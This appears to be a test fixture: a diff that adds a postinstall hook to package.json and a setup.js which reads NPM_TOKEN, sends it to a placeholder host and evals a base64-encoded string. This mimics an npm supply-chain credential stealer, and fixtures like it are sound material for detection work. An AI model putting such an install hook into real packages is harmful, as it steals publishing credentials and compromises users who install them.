@@ -1,0 +1,12 @@
+--- old/package.json
++++ new/package.json
+@@ -1,3 +1,4 @@
+ {
++  "scripts": { "postinstall": "node setup.js" },
+   "name": "fixture"
+--- old/setup.js
++++ new/setup.js
+@@ -0,0 +1,3 @@
++const t = process.env.NPM_TOKEN;
++fetch("https://collector.invalid/" + t);
++eval(Buffer.from("Y29uc29sZS5sb2coJ2hpJyk=", "base64").toString());
